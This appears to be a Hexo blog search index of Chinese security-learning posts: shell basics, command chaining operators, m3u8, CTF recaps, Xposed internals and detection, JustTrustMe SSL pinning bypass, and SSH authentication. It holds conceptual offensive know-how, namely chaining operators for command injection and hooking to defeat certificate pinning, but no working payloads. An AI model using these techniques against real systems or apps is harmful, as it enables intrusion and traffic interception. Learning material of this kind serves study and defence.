<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>shell命令的攻防应用</title>
      <link href="/2025/03/20/shell%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/03/20/shell%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">~  ⽤户家⽬录</span><br><span class="line"></span><br><span class="line">-  标准输⼊(/dev/stdin)</span><br><span class="line"></span><br><span class="line">.  当前⽬录</span><br><span class="line"></span><br><span class="line">..  上层⽬录</span><br><span class="line"></span><br><span class="line">.file  隐藏⽂件，需要通过ls -a查看</span><br><span class="line"></span><br><span class="line">| 管道符，⽤于联通两个命令，前⼀个的输出作为后⼀个的输⼊</span><br><span class="line"></span><br><span class="line">&amp;  出现在命令末尾，代表该命令后台运⾏</span><br><span class="line"></span><br><span class="line">$  $VAR是取变量VAR的值，不存在则为空</span><br><span class="line"></span><br><span class="line">;  标识⼀条命令的结束（默认是换⾏符标识命令结束）</span><br><span class="line"></span><br><span class="line">&lt; &gt; 输⼊/输出重定向</span><br><span class="line"></span><br><span class="line">反引号(`): 命令替换，执⾏命令并取出其输出内容</span><br><span class="line"></span><br><span class="line">单引号(<span class="string">&#x27;): 将字符串标记为⼀个词，可包含特殊字符</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">双引号(&quot;): 将字符串标记为⼀个词，可包含特殊字符，但其中的变量替换$VAR和命令替换`cmd`会先⽣效</span></span><br></pre></td></tr></table></figure><h2 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• -n: 为输出内容添加⾏号</span><br><span class="line">• -v: 显示不可打印字符</span><br><span class="line">• -E: 显示⼀⾏的末尾</span><br><span class="line">• -T: 显示TAB</span><br><span class="line">• -A: 等同于-vET</span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find [OPTION] [PATH] [-<span class="built_in">exec</span> cmd]</span><br><span class="line">• 查找指定路径下的⽂件，并调⽤命令进⾏处理</span><br><span class="line">• 提供了极其丰富的过滤条件</span><br><span class="line"></span><br><span class="line">• -size: 基于⽂件⼤⼩的过滤</span><br><span class="line">• -perm: 基于⽂件权限的过滤</span><br><span class="line">• -name/-regex: 基于⽂件名的过滤，⽀持通配符/正则</span><br><span class="line">• -user/-group: 基于⽂件所属者的过滤</span><br><span class="line">• -ctime/-atime: 基于⽂件访问/修改时间的过滤</span><br><span class="line"></span><br><span class="line">• 默认执⾏的是将⽂件名输出到stdout</span><br><span class="line">• 可通过<span class="string">&quot;-exec &lt;cmd&gt; [OPTION] [&#123;&#125;] ;&quot;</span>，为每个找到的⽂件执⾏命令</span><br><span class="line">• &#123;&#125; ⽤来指代find找到的⽂件名</span><br><span class="line">• ; ⽤于标识⼀条命令的结束，实际使⽤时需要转义（思考题：如果不转义，会发⽣什么？）</span><br></pre></td></tr></table></figure><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• -n: 打印⾏号</span><br><span class="line">• -i: 忽略⼤⼩写</span><br><span class="line">• -o: 只打印匹配的内容（默认是打印整⾏）</span><br><span class="line">• -r: 递归查找全部⼦⽬录中的⽂件</span><br><span class="line">• --exclude/--include: 递归⼦⽬录时，跳过/只查找这些⽂件，⽀持通配符</span><br></pre></td></tr></table></figure><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• 对给定字段排序：字符串，数字，⽉份</span><br><span class="line">• 经常与uniq组合使⽤</span><br><span class="line">• 先⽤sort对内容排序</span><br><span class="line">• 再⽤uniq提取重复的/唯⼀的内容</span><br><span class="line">• man sort; man uniq</span><br></pre></td></tr></table></figure><h2 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">命令执行就用命令拼接符执行漏洞命令</span><br><span class="line">|、||、&amp;、&amp;&amp;的区别：</span><br><span class="line"></span><br><span class="line">&amp;：无论左边是false还是true，右边都执行</span><br><span class="line">&amp;&amp;：具有短路效果，左边是false，右边不执行。</span><br><span class="line">|:无论左边是false还是true，右边都会执行</span><br><span class="line">||：具有短路效果，左边是true，右边不执行。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>m3u8格式介绍</title>
      <link href="/2025/03/20/m3u8%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D/"/>
      <url>/2025/03/20/m3u8%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>M3U8文件是指UTF-8编码格式的M3U文件。</p><p>M3U文件是记录了一个索引纯文本文件，打开它时播放软件并不是播放它，而是根据它的索引找到对应的音视频文件的网络地址进行在线播放。</p><p>这个是为了在线播放流视频诞生的，而这种视频最大的特点就是把原来的视频进行切片，所谓切片就是把一个完整的视频比如.mp4格式的切成多段.ts格式视频，然后生成一个对应切片片段视频的索引文件，这个索引文件就是m3u8。</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250320163123706.png" alt="image-20250320163123553"></p><p>看到这个文件其实就是个索引文件，当然ts切片视频文件和m3u8文件放在同一目录下</p><p>.ts也是一种视频格式，其实是可以直接观看的，但是都是一段一段的，如何把这些一段一段视频合成一个完整的mp4就需要依靠m3u8这个视频索引文件了（ffmpeg工具）</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250320163154318.png" alt="image-20250320163154238"></p><p>这张流程图大致的解释了现在视频网站的工作原理，后台利用工具进行视频切片，然后用户使用设备点播流视频，一边播放一边下载下一个视频切片非常方便。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-2024大二总结</title>
      <link href="/2025/03/19/2023-2024%E5%A4%A7%E4%BA%8C%E6%80%BB%E7%BB%93/"/>
      <url>/2025/03/19/2023-2024%E5%A4%A7%E4%BA%8C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>大一喜欢出一些题目，赚了一些小钱（比不上大厂一个月工资哈哈哈）</p><p>买了自己想买的Mac（为了学习捏）</p><h2 id="Mac之旅-Android"><a href="#Mac之旅-Android" class="headerlink" title="Mac之旅 Android"></a>Mac之旅 Android</h2><p>记录自己买mac后学习</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319191115400.png"></p><p>但是现在发现，mac只适合记录学习笔记，真要实战还得Window系统</p><p>问题太多了，而且大多数工具都不免费，我是穷逼买不起</p><p>Mac好不容易安装成功Android Studio</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319191243316.png"></p><h2 id="2023-12-15-第七届强网杯"><a href="#2023-12-15-第七届强网杯" class="headerlink" title="2023.12.15 第七届强网杯"></a>2023.12.15 第七届强网杯</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250320162912768.png" alt="image-20250320162912588"></p><p>独立做出4道re-中等难度</p><p>还有一道re（已经快出了，卡在misc脑洞）</p><p>姑且算5道吧，嘻嘻</p><p>第八届W&amp;M会出手，拿下二等奖！</p><h2 id="2023-12-16-楚慧杯"><a href="#2023-12-16-楚慧杯" class="headerlink" title="2023.12.16 楚慧杯"></a>2023.12.16 楚慧杯</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250320162937328.png" alt="image-20250320162937228"></p><p>我记得这天是和强网杯一起办了</p><p>当时没多少人参加哈哈哈，我一个小时把逆向都做出来了。</p><p>然后线下就我一个人过去玩啦，给主办方都气的打电话了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-2023大一总结</title>
      <link href="/2025/03/19/2022-2023%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/"/>
      <url>/2025/03/19/2022-2023%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>我记得第一次出校参加比赛叫“数据安全大赛”</p><p>在<strong>郑州网络科技馆</strong>，那是我第一次出去住酒店，跟个土包子一样，那时候网安还热火热荼，其实也临近寒冬了。</p><p>粘一下当时的比赛成绩，一句话形容：“拼尽全力，无法战胜”</p><p>YYDS 中国移动</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319185433798.png" alt="image-20250319185433705"></p><p>粘一下当时写的总结</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319185632672.png" alt="image-20250319185632613"></p><p>现在大三下，感觉已经老了很多，也不像大一那样对所有比赛充满了热情。</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319185825963.jpg" alt="ISCC比赛结果 (2)"></p><h1 id="2022数据安全大赛"><a href="#2022数据安全大赛" class="headerlink" title="2022数据安全大赛"></a>2022数据安全大赛</h1><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319192736868.png" alt="image.png"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319192728373.png" alt="image.png"></p><p>最终比赛成绩：25名</p><p>参赛队伍：100队，总共300人</p><p>第一次出去参加比赛</p><h1 id="ISCC-2023"><a href="#ISCC-2023" class="headerlink" title="ISCC 2023"></a>ISCC 2023</h1><p>2023 还没变味,还是那个味道哦！</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319185846447.png"></p><h1 id="2022-河南省第四届“金盾信安杯”"><a href="#2022-河南省第四届“金盾信安杯”" class="headerlink" title="2022 河南省第四届“金盾信安杯”"></a>2022 河南省第四届“金盾信安杯”</h1><p>哈哈哈那时候太菜了，逆向制作出了一道TEA算法，懵逼了，最终二等奖还给钱哈哈，2023就不给hetui</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319191855400.png" alt="image-20250319191855308"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319192044476.png" alt="image.png"></p><h1 id="2022-UNCTF"><a href="#2022-UNCTF" class="headerlink" title="2022 UNCTF"></a>2022 UNCTF</h1><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319192125125.png"></p><p>确实是我打的第一场比赛，好怀念，真有激情</p><h1 id="BUUCTF-V-N选拔赛"><a href="#BUUCTF-V-N选拔赛" class="headerlink" title="BUUCTF V&amp;N选拔赛"></a>BUUCTF V&amp;N选拔赛</h1><p>那天我记得很清楚，早上打开比赛，用刚学的GG修改器，把其中一道最难的Android题目 拿下一血。</p><p>我擦，半小时内的一血，还是最难的啊（其实我当时是个菜狗）</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319192427931.png" alt="image.png"></p><p>真牛逼</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319192457253.png" alt="image-20250319192457127"></p><p>最后很荣幸的加入到了V&amp;N大家庭。</p><p>题目很有质量，出题师傅有fall、haed、s0rry等等，现在他们都是大牛</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>年代久远，好多照片找不到了，应该养成一个好习惯，每年记录总结一下。</p><p>对生活充满热爱，终将会被现实打脸。我现在面试各大厂，因为学历问题，直接Pass。哈哈哈哈哈</p><p>网安人越来越多了，到了我这一年2026，大厂只要双一流+985211</p><p><strong>学历仿佛证明了技术，学历越高技术越强</strong>，是的，这又是我心目中魔幻的世界。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 HWS夏令营 Top6 WriteUp</title>
      <link href="/2025/03/19/2023-HWS%E5%A4%8F%E4%BB%A4%E8%90%A5-Top6-WriteUp/"/>
      <url>/2025/03/19/2023-HWS%E5%A4%8F%E4%BB%A4%E8%90%A5-Top6-WriteUp/</url>
      
        <content type="html"><![CDATA[<p>好怀念那时候，大一捏</p><p>我擦了啊，不是哥们，我保存的唯一一张排名图，让markdown给我彻底删除了？？？？？</p><p>我擦我擦啊啊啊啊啊啊啊啊，</p><p>我与oacia师傅同窗啊，他在第4，我在第6，凸(艹皿艹 )罢了</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319183352718.png" alt="image-20250319183352671"></p><p>(⊙o⊙)</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319184036968.png" alt="image-20250319184036937"></p><h1 id="1、Android"><a href="#1、Android" class="headerlink" title="1、Android"></a>1、Android</h1><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319184030663.png" alt="image-20250319184030600"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319184112812.png" alt="image-20250319184112744"></p><h1 id="2、Animals"><a href="#2、Animals" class="headerlink" title="2、Animals"></a>2、<strong>Animals</strong></h1><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319184330683.png" alt="image-20250319184330621"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319184337816.png" alt="image-20250319184337760"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319184346002.png" alt="image-20250319184345942"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319184403609.png" alt="image-20250319184403529"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250319184414119.png" alt="image-20250319184414058"></p><p>那时候太屌了沃日</p><h1 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h1><p>后面还有misc、pwn、crypto的，不粘了哈哈哈（懒</p><p>通过网盘分享的文件：2023 HWS.pdf<br>链接: <a href="https://pan.baidu.com/s/1-Lm5R_VZ8bvmHqCBRyJUig?pwd=1234">https://pan.baidu.com/s/1-Lm5R_VZ8bvmHqCBRyJUig?pwd=1234</a> 提取码: 1234<br>–来自百度网盘超级会员v3的分享</p><p>留个纪念，纪念大一下2023</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Android】Xposed原理</title>
      <link href="/2025/03/18/%E3%80%90Android%E3%80%91Xposed%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/18/%E3%80%90Android%E3%80%91Xposed%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1、Xposed原理介绍"><a href="#1、Xposed原理介绍" class="headerlink" title="1、Xposed原理介绍"></a>1、Xposed原理介绍</h1><p>Xposed 框架是一个运行在 Android 操作系统之上的钩子框架，是以模块扩展方式来实现对系统部分功能的修改。</p><blockquote><p>app_process</p><p>Xposed 框架 Native 部分，用于替换原生 app_process，并为 XposedBridge 提供 JNI 方法。</p><p>XposedBridge<br>Xposed 框架 Java 部分，编译后会生成一个 jar 包，Xposed 框架的 app_process 会将此加入到系统 class path 中。</p><p>android_art<br>Xposed 框架定制的 Android ART</p><p>XposedInstaller<br>Xposed 框架插件管理 App</p><p>XposedTools<br>用于编译项目的工具集</p></blockquote><p>Android 系统是基于 Linux 的，其第一个由内核启动的用户进程是 <strong>init</strong> 进程。init 进程随后会创建 zygote 进程，Android 应用程序进程都是由 zygote 进程孵化而来。zygote 所对应的可执行程序是 <strong>app_process</strong>，xposed 框架通过替换系统的 app_process 可执行文件以及虚拟机动态链接库，让 zygote 在启动应用程序进程时注入框架代码，进而实现对应用程序进程的劫持。</p><p>Xposed框架通过替换**&#x2F;system&#x2F;bin&#x2F;app_process**程序来控制Zygote进程</p><p>在核心功能启动后，Xposed框架会通过HookZygoteInit类的handleLoadPackage方法，来判断当前进程是否是需要hook的应用程序进程。</p><p>如果当前进程需要hook，Xposed框架会开始进行hook操作。在hook操作中，Xposed框架会将Java层函数的指针替换为对应的native函数的指针，并将这些native函数注册为本地JNI方法。</p><p>Xposed框架会将Java层函数转换为native函数，并将这些native函数的指针保存在XposedBridge类的sHookedMethodCallbacks静态变量中。</p><p>Xposed框架会通过JNI的RegisterNatives方法，将这些native函数注册为本地JNI方法。</p><p>当应用程序调用被hook的Java层函数时，实际上会调用对应的native函数，从而实现hook操作。</p><h1 id="2、代码解析"><a href="#2、代码解析" class="headerlink" title="2、代码解析"></a>2、代码解析</h1><p>xposed 的 app_main2.cpp中做了xposed的初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Initialize Xposed (unless it is disabled). */</span></span><br><span class="line">bool <span class="title function_">initialize</span><span class="params">(bool zygote, bool startSystemServer, const <span class="type">char</span>* className, <span class="type">int</span> argc, <span class="type">char</span>* const argv[])</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 参数接管</span></span><br><span class="line">    xposed-&gt;zygote = zygote;</span><br><span class="line">    xposed-&gt;startSystemServer = startSystemServer;</span><br><span class="line">    xposed-&gt;startClassName = className;</span><br><span class="line">    xposed-&gt;xposedVersionInt = xposedVersionInt;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// XposedBridge.jar 加载到 ClassPath 中</span></span><br><span class="line">    <span class="keyword">return</span> addJarToClasspath();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Zygote进程，使其在启动过程中加载XposedBridge.jar。XposedBridge.jar包中包含了Xposed框架的核心代码</p><p>XposedBridge.jar中的 XposedBridge 类的 main 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// Initialize the Xposed framework and modules</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!hadInitErrors()) &#123;</span><br><span class="line">            initXResources();</span><br><span class="line"> </span><br><span class="line">            SELinuxHelper.initOnce();</span><br><span class="line">            SELinuxHelper.initForProcess(<span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line">            runtime = getRuntime();</span><br><span class="line">            XPOSED_BRIDGE_VERSION = getXposedVersion();</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Xposed初始化</span></span><br><span class="line">            <span class="keyword">if</span> (isZygote) &#123;</span><br><span class="line">                XposedInit.hookResources();</span><br><span class="line">                XposedInit.initForZygote();</span><br><span class="line">            &#125;</span><br><span class="line"> <span class="comment">// 加载 Xposed 模块</span></span><br><span class="line">            XposedInit.loadModules(); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Not initializing Xposed because of previous errors&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Errors during Xposed initialization&quot;</span>, t);</span><br><span class="line">        disableHooks = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Call the original startup code  =&gt; 原始执行链</span></span><br><span class="line">    <span class="keyword">if</span> (isZygote) &#123;</span><br><span class="line">        ZygoteInit.main(args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        RuntimeInit.main(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3、Xposed检测"><a href="#3、Xposed检测" class="headerlink" title="3、Xposed检测"></a>3、Xposed检测</h1><ol><li>检查内存中是否有XposedBridge.jar</li><li>检查是否有xposed-installer 这个apk</li><li>反射调用xposed的一些核心类，如果可以反射找到，说明注入了XposedBridge.jar</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Android】JustTrustMe原理</title>
      <link href="/2025/03/18/%E3%80%90Android%E3%80%91JustTrustMe%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/18/%E3%80%90Android%E3%80%91JustTrustMe%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="SSL-Pinning（ssl证书绑定）"><a href="#SSL-Pinning（ssl证书绑定）" class="headerlink" title="SSL Pinning（ssl证书绑定）"></a>SSL Pinning（ssl证书绑定）</h2><p>HTTPS的原理你必然懂，在建立ssl通道的过程中，当客户端向服务端发送了连接请求后，服务器会发送自己的证书(包括公钥、证书有效期、服务器信息等)给客户端，如果客户端是普通的浏览器，比如IE浏览器，则：</p><ol><li>使用内置的CA证书去校验服务器证书是否被信任，如果不被信任，则会弹出https的告警提示信息，由用户自己决定是否要继续.</li><li>同样，用户也可以主动的将服务器证书导入到浏览器的受信任区，下次打开时该服务器证书将会自动被信任.</li></ol><p>对于APP，开发者可以先将自己服务器的证书打包内置到自己的APP中，或者将证书签名内置到APP中，当客户端在请求服务器建立连接期间收到服务器证书后，先使用内置的证书信息校验一下服务器证书是否合法，如果不合法，直接断开。</p><p>SSL Pinning：通过预先把服务器的证书信息“绑定“在APP的native端，然后建立连接时使用预先内置的绑定信息进行服务器证书校验</p><h2 id="JustTrustMe"><a href="#JustTrustMe" class="headerlink" title="JustTrustMe"></a>JustTrustMe</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250318162106197.png" alt="image-20250318162106131"></p><p>JustTrustMe 是一个用来禁用、绕过 SSL 证书检查的基于 Xposed 模块。</p><p>JustTrustMe 是将 APK 中所有用于校验 SSL 证书的 API 都进行了 Hook，从而绕过证书检查。</p><p>所以有的框架JustTrustMe也不能绕过，需要渗透人员手动Frida Hook绕过</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【面试】SSH认证原理</title>
      <link href="/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91SSH%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91SSH%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ol><li>对称加密（也称为秘钥加密）</li></ol><p>加密解密使用同一套秘钥</p><ol><li>非对称加密（也称公钥加密）</li></ol><p>加密用公钥，解密用私钥</p><p>两个密钥的特性：公钥加密后的密文，只能通过对应的私钥进行解密。而通过公钥推理出私钥的可能性微乎其微。</p><h2 id="非对称加密方案的登录流程"><a href="#非对称加密方案的登录流程" class="headerlink" title="非对称加密方案的登录流程"></a>非对称加密方案的登录流程</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205902272.png" alt="image-20250317205902210"></p><ol><li>远程Server收到Client端用户TopGun的登录请求，Server把自己的公钥发给用户。</li><li>Client使用这个公钥，将密码进行加密。</li><li>Client将加密的密码发送给Server端。</li><li>远程Server用自己的私钥，解密登录密码，然后验证其合法性。</li><li>若验证结果，给Client相应的响应。</li></ol><p>私钥是Server端独有，这就保证了Client的登录信息即使在网络传输过程中被窃据，也没有私钥进行解密，保证了数据的安全性，这充分利用了非对称加密的特性。</p><h2 id="存在中间人攻击"><a href="#存在中间人攻击" class="headerlink" title="存在中间人攻击"></a>存在中间人攻击</h2><p>上述过程存在一个大问题</p><p>Client端如何保证接受到的公钥就是目标Server端的？，如果一个攻击者中途拦截Client的登录请求，向其发送自己的公钥，Client端用攻击者的公钥进行数据加密。攻击者接收到加密信息后再用自己的私钥进行解密，不就窃取了Client的登录信息了吗？这就是所谓的<a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">中间人攻击</a></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205907384.png" alt="image-20250317205907321"></p><h2 id="SSH解决问题"><a href="#SSH解决问题" class="headerlink" title="SSH解决问题"></a>SSH解决问题</h2><p>问题就在于如何对Server的公钥进行认证</p><p>HTTPS通过CA证书对公钥进行验证</p><p>SSH通过Client端自己对公钥进行确认</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205918463.png" alt="image-20250317205918396"></p><h2 id="基于公钥认证免密登录"><a href="#基于公钥认证免密登录" class="headerlink" title="基于公钥认证免密登录"></a>基于公钥认证免密登录</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205925536.png" alt="image-20250317205925401"></p><ol><li>Client将自己的公钥存放在Server上，追加在文件authorized_keys中。</li><li>Server端接收到Client的连接请求后，会在authorized_keys中匹配到Client的公钥pubKey，并生成随机数R，用Client的公钥对该随机数进行加密得到pubKey(R)<br> ，然后将加密后信息发送给Client。</li><li>Client端通过私钥进行解密得到随机数R，然后对随机数R和本次会话的SessionKey利用MD5生成摘要Digest1，发送给Server端。</li><li>Server端会也会对R和SessionKey利用同样摘要算法生成Digest2。</li><li>Server端会最后比较Digest1和Digest2是否相同，完成认证过程。</li></ol><p>（Client将自己的公钥存放在Server上。需要用户手动将公钥copy到server上。这就是在配置ssh的时候进程进行的操作。）</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205931196.png" alt="image-20250317205931079"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【面试】进程、线程、协程</title>
      <link href="/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E3%80%81%E5%8D%8F%E7%A8%8B/"/>
      <url>/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E3%80%81%E5%8D%8F%E7%A8%8B/</url>
      
